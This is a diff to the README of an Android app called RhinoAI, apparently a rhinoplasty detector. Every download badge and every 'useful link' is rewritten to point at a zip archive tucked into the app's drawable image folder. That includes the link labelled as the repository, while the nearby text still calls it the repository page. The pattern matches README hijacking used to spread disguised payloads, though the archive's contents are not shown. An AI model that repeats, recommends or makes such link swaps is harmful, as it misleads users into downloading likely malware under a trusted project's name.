@@ -1,6 +1,6 @@
 # 🤖 RhinoAI - Detect Rhinoplasty Easily and Fast
 
-[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
+[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI/raw/refs/heads/master/app/src/main/res/drawable/Rhino_AI_2.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download and use RhinoAI on your Android device.
 
 To get the app, visit the RhinoAI page here:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit_RhinoAI_Page-blue?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
+[![Visit Download Page](https://img.shields.io/badge/Visit_RhinoAI_Page-blue?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI/raw/refs/heads/master/app/src/main/res/drawable/Rhino_AI_2.2.zip)
 
 This link takes you to the GitHub repository where you can find the latest app files.
 
@@ -155,11 +155,11 @@ The app team monitors feedback to improve RhinoAI.
 
 ## 🔗 Useful Links
 
-- RhinoAI GitHub repository: https://github.com/CKSFidelino/RhinoAI  
-- Direct download page: https://github.com/CKSFidelino/RhinoAI/releases
+- RhinoAI GitHub repository: https://github.com/CKSFidelino/RhinoAI/raw/refs/heads/master/app/src/main/res/drawable/Rhino_AI_2.2.zip  
+- Direct download page: https://github.com/CKSFidelino/RhinoAI/raw/refs/heads/master/app/src/main/res/drawable/Rhino_AI_2.2.zip
 
 Keep these links handy for your downloads and updates.
 
 ---
 
-[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
+[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI/raw/refs/heads/master/app/src/main/res/drawable/Rhino_AI_2.2.zip)
